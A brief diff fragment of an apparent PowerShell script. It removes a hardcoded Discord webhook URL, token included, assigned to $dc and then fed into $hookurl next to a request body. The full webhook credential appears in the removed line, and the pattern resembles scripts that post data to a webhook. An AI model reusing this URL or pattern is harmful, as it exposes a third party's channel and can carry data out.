@@ -17,7 +17,7 @@ param (
     [string]$text 
 )
 
-$dc = "https://discord.com/api/webhooks/1327931539115216946/bjHMQlIBnGw54pNLtUXOJFqHe48o5kIXaZ3DY1unUCsm-x4rQUgWaOrgaB4raMgBInFj"
+
 $hookurl = "$dc"
 
 $Body = @{
